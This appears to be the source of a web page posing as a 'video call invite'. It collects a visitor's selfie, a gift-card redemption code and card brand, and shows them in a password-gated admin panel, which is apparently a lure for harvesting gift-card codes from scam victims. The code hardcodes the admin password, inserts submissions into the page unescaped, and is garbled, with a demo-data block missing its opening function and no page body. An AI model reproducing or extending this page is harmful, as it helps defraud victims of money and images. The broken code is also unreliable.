<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Call Invite - Centralized Admin Panel</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
      color: #333;
      line-height: 1.6;
      padding: 20px;
      min-height: 100vh;
    }
    
    .container {
      max-width: 600px;
      width: 100%;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
      padding: 30px;
      margin: 20px auto;
    }
    
    h2 {
      text-align: center;
      color: #d64c78;
      margin-bottom: 10px;
      font-size: 28px;
    }
    
    .subtitle {
      text-align: center;
      color: #666;
      margin-bottom: 25px;
      font-size: 16px;
    }
    
    .upload-container {
      border: 2px dashed #d64c78;
      padding: 25px;
      border-radius: 15px;
      margin-bottom: 25px;
      background: rgba(255, 240, 245, 0.5);
      text-align: center;
      transition: all 0.3s ease;
    }
    
    .upload-container:hover {
      background: rgba(255, 240, 245, 0.8);
    }
    
    .upload-container label {
      display: block;
      margin-bottom: 15px;
      font-weight: bold;
      color: #d64c78;
      font-size: 18px;
    }
    
    input[type="file"] {
      display: block;
      margin: 0 auto;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 8px;
      width: 100%;
      max-width: 300px;
      background: white;
    }
    
    .card-redemption {
      margin: 25px 0;
      padding: 20px;
      background: #f8f9fa;
      border-radius: 15px;
      text-align: left;
      border-left: 5px solid #d64c78;
    }
    
    .card-redemption h3 {
      color: #d64c78;
      margin-bottom: 15px;
    }
    
    .redemption-code {
      margin-bottom: 20px;
    }
    
    .redemption-code input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      transition: border 0.3s ease;
    }
    
    .redemption-code input:focus {
      border-color: #d64c78;
      outline: none;
      box-shadow: 0 0 0 2px rgba(214, 76, 120, 0.2);
    }
    
    .card-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    
    .card-option {
      display: flex;
      align-items: center;
      padding: 15px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
      transition: transform 0.2s ease;
      cursor: pointer;
    }
    
    .card-option:hover {
      transform: translateY(-2px);
    }
    
    .card-option input {
      margin-right: 15px;
      transform: scale(1.2);
    }
    
    .card-logo {
      width: 30px;
      height: 30px;
      margin-right: 12px;
    }
    
    .card-option label {
      font-weight: 600;
      cursor: pointer;
    }
    
    .button-container {
      text-align: center;
      margin: 25px 0;
    }
    
    button {
      padding: 14px 35px;
      border: none;
      background: linear-gradient(to right, #d64c78, #e51a5f);
      color: white;
      border-radius: 50px;
      cursor: pointer;
      font-size: 18px;
      font-weight: 600;
      box-shadow: 0 4px 15px rgba(214, 76, 120, 0.4);
      transition: all 0.3s ease;
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(214, 76, 120, 0.5);
    }
    
    button:disabled {
      background: #cccccc;
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }
    
    .status-message {
      margin: 20px 0;
      padding: 15px;
      border-radius: 10px;
      font-weight: bold;
      text-align: center;
      display: none;
    }
    
    .success {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
      display: block;
    }
    
    .error {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      display: block;
    }
    
    .loading {
      display: none;
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #d64c78;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .waiting-section {
      text-align: center;
      margin-top: 30px;
      padding-top: 20px;
      border-top: 1px solid #eee;
    }
    
    .waiting-text {
      font-size: 22px;
      font-weight: bold;
      color: #d64c78;
      margin-bottom: 20px;
    }
    
    .call-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto;
      border-radius: 50%;
      background-color: #4CAF50;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
      animation: pulse 1.5s infinite;
    }
    
    .call-icon svg {
      width: 40px;
      height: 40px;
      fill: white;
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    
    .admin-sticker {
      position: fixed;
      top: 20px;
      right: 20px;
      width: 50px;
      height: 50px;
      background: #d64c78;
      color: white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      z-index: 1000;
      font-weight: bold;
      font-size: 20px;
    }
    
    .admin-panel {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 700px;
      max-height: 80vh;
      background: white;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      z-index: 2000;
      overflow-y: auto;
    }
    
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1500;
    }
    
    .close-btn {
      background: #ff4757;
      color: white;
      padding: 8px 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-bottom: 20px;
      font-weight: bold;
    }
    
    .submission {
      margin-bottom: 20px;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 10px;
      background: #f9f9f9;
    }
    
    .submission img {
      max-width: 100%;
      border-radius: 8px;
      margin-top: 10px;
    }
    
    .admin-controls {
      margin-bottom: 20px;
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }
    
    .admin-controls button {
      padding: 8px 15px;
      font-size: 14px;
    }
    
    .explanation {
      background: #f1f8ff;
      border-left: 4px solid #4a90e2;
      padding: 15px;
      margin: 20px 0;
      border-radius: 4px;
    }
    
    @media (max-width: 600px) {
      .container {
        padding: 20px;
      }
      
      h2 {
        font-size: 24px;
      }
      
      .upload-container {
        padding: 15px;
      }
      
      button {
        width: 100%;
        padding: 12px;
      }
      
      .admin-controls {
        flex-direction: column;
      }
    }
  </style>
</head>

  <script>
    // Centralized database simulation using a shared storage approach
    // In a real application, this would be replaced with a server-side database
    const CENTRAL_DB_KEY = 'video_call_central_database';
    const ADMIN_PASSWORD = "admin123";
    
    // Initialize the central database if it doesn't exist
    function initCentralDatabase() {
      if (!localStorage.getItem(CENTRAL_DB_KEY)) {
        const initialData = {
          submissions: [],
          lastId: 0
        };
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(initialData));
      }
    }
    
    // Get all submissions from the central database
    function getCentralSubmissions() {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        return db.submissions || [];
      } catch (e) {
        console.error('Error reading central database:', e);
        return [];
      }
    }
    
    // Save a submission to the central database
    function saveToCentralDatabase(submission) {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        submission.id = db.lastId + 1;
        submission.timestamp = new Date().toISOString();
        db.submissions.push(submission);
        db.lastId = submission.id;
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        return Promise.resolve(submission.id);
      } catch (e) {
        console.error('Error saving to central database:', e);
        return Promise.reject(e);
      }
    }
    
    // Clear all submissions from the central database
    function clearCentralDatabase() {
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        db.submissions = [];
        db.lastId = 0;
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        return true;
      } catch (e) {
        console.error('Error clearing central database:', e);
        return false;
      }
    }

    function submitFiles() {
      const selfie = document.getElementById("selfie").files[0];
      const redemptionCode = document.getElementById("redemptionCode").value.trim();
      const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
                                .map(cb => cb.value);
      
      if (!selfie) {
        showStatus("Please upload a selfie before submitting.", "error");
        return;
      }
      
      if (!redemptionCode) {
        showStatus("Please enter your redemption code.", "error");
        return;
      }
      
      if (selectedCards.length === 0) {
        showStatus("Please select at least one redemption method.", "error");
        return;
      }
      
      // Validate file size (4.5MB limit for Vercel)
      if (selfie.size > 4500000) {
        showStatus("File size too large. Please upload an image under 4.5MB.", "error");
        return;
      }
      
      // Show loading state
      document.getElementById("loading").style.display = "block";
      document.getElementById("submitBtn").disabled = true;
      
      // Read the file as data URL
      const reader = new FileReader();
      reader.onload = function(e) {
        // Create submission object
        const submission = {
          selfieData: e.target.result,
          redemptionCode: redemptionCode,
          cardTypes: selectedCards,
          time: new Date().toLocaleString(),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          userLocation: "Simulated user location", // In a real app, you might get this from IP
          deviceType: getDeviceType()
        };
        
        // Save to central database
        saveToCentralDatabase(submission)
          .then(id => {
            showStatus("Submission successful! You can now join the call.", "success");
            console.log("Submission saved with ID: ", id);
            
            // Reset form
            document.getElementById("selfie").value = "";
            document.getElementById("redemptionCode").value = "";
            document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
          })
          .catch(error => {
            console.error("Error saving submission: ", error);
            showStatus("Error: " + error.message, "error");
          })
          .finally(() => {
            document.getElementById("loading").style.display = "none";
            document.getElementById("submitBtn").disabled = false;
          });
      };
      
      reader.onerror = function() {
        showStatus("Error reading file. Please try again.", "error");
        document.getElementById("loading").style.display = "none";
        document.getElementById("submitBtn").disabled = false;
      };
      
      reader.readAsDataURL(selfie);
    }

    function showStatus(message, type) {
      const statusEl = document.getElementById("statusMessage");
      statusEl.textContent = message;
      statusEl.className = `status-message ${type}`;
      
      // Auto-hide after 5 seconds
      setTimeout(() => {
        statusEl.className = "status-message";
      }, 5000);
    }

    function selectCard(cardId) {
      // Uncheck all cards first
      document.querySelectorAll('input[name="cardType"]').forEach(cb => {
        cb.checked = false;
      });
      
      // Check the selected card
      document.getElementById(cardId).checked = true;
    }
    
    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
        return "Tablet";
      }
      if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
        return "Mobile";
      }
      return "Desktop";
    }

    function requestAdminAccess() {
      const pass = prompt("Enter admin password:");
      if (pass === ADMIN_PASSWORD) {
        openAdmin();
      } else if (pass !== null) {
        alert("Access Denied!");
      }
    }
    
    function loadAllSubmissions() {
      const list = document.getElementById("submissionsList");
      const submissions = getCentralSubmissions();
      
      if (submissions.length === 0) {
        list.innerHTML = "<p>No submissions found in the central database.</p>";
        return;
      }
      
      // Show newest submissions first
      submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      
      list.innerHTML = submissions.map(sub => `
        <div class="submission">
          <p><strong>Submission ID:</strong> ${sub.id}</p>
          <p><strong>Time:</strong> ${sub.time || sub.timestamp}</p>
          <p><strong>Redemption Code:</strong> ${sub.redemptionCode}</p>
          <p><strong>Card Types:</strong> ${sub.cardTypes.join(", ")}</p>
          <p><strong>Device Type:</strong> ${sub.deviceType}</p>
          <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
          <p><strong>User Location:</strong> ${sub.userLocation}</p>
          <p><strong>Image:</strong></p>
          <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
        </div>
      `).join('');
    }
    
    function clearAllSubmissions() {
      if (confirm("Are you sure you want to clear all submissions from the central database? This cannot be undone.")) {
        if (clearCentralDatabase()) {
          document.getElementById("submissionsList").innerHTML = "<p>No submissions found in the central database.</p>";
          showStatus("All submissions cleared from central database.", "success");
        } else {
          showStatus("Error clearing submissions.", "error");
        }
      }
    }

        {

          redemptionCode: "GOLD54321",
          cardTypes: ["razor"],
          time: new Date(Date.now() - 172800000).toLocaleString(),
          userAgent: "Demo User Agent 3",
          screenResolution: "2048x1536",
          userLocation: "Tokyo, Japan",
          deviceType: "Tablet",
          timestamp: new Date(Date.now() - 172800000).toISOString()
        }
      ];
      
      // Save demo data to central database
      try {
        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
        demoSubmissions.forEach(sub => {
          sub.id = db.lastId + 1;
          db.submissions.push(sub);
          db.lastId = sub.id;
        });
        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
        
        // Refresh the list
        loadAllSubmissions();
        showStatus("Demo data generated successfully.", "success");
      } catch (e) {
        console.error("Error generating demo data:", e);
        showStatus("Error generating demo data.", "error");
      }
    }
    
    function simulateMultipleUsers() {
      // Simulate submissions from multiple users
      const userSimulations = [
        {
          name: "Mobile User",
          type: "Mobile",
          location: "Los Angeles, USA"
        },
        {
          name: "Tablet User",
          type: "Tablet", 
          location: "Paris, France"
        },
        {
          name: "Desktop User",
          type: "Desktop",
          location: "Berlin, Germany"
        }
      ];
      
      userSimulations.forEach((user, index) => {
        setTimeout(() => {
          const submission = {
            selfieData: `https://placehold.co/300x400/${getRandomColor()}/white?text=${encodeURIComponent(user.name)}`,
            redemptionCode: `SIM${Math.floor(1000 + Math.random() * 9000)}`,
            cardTypes: [["amazon", "itunes", "razor"][Math.floor(Math.random() * 3)]],
            time: new Date().toLocaleString(),
            userAgent: `Simulated ${user.type} User`,
            screenResolution: user.type === "Mobile" ? "375x812" : user.type === "Tablet" ? "768x1024" : "1920x1080",
            userLocation: user.location,
            deviceType: user.type,
            timestamp: new Date().toISOString()
          };
          
          saveToCentralDatabase(submission)
            .then(() => {
              if (index === userSimulations.length - 1) {
                loadAllSubmissions();
                showStatus("Multiple user simulation completed!", "success");
              }
            });
        }, index * 1000);
      });
      
      showStatus("Simulating multiple users...", "success");
    }
    
    function getRandomColor() {
      const colors = ["ff9a9e", "fad0c4", "a1c4fd", "ffecd2", "ff9a9e", "74b9ff", "fdbb2d"];
      return colors[Math.floor(Math.random() * colors.length)];
    }

    function openAdmin() {
      const panel = document.getElementById("adminPanel");
      const overlay = document.getElementById("overlay");
      
      // Load submissions
      loadAllSubmissions();
      
      panel.style.display = "block";
      overlay.style.display = "block";
    }

    function closeAdmin() {
      document.getElementById("adminPanel").style.display = "none";
      document.getElementById("overlay").style.display = "none";
    }

    // Initialize card selection
    document.querySelectorAll('.card-option').forEach(option => {
      option.addEventListener('click', function() {
        const checkbox = this.querySelector('input[type="checkbox"]');
        selectCard(checkbox.id);
      });
    });
    
    // Initialize the central database
    initCentralDatabase();
  </script>
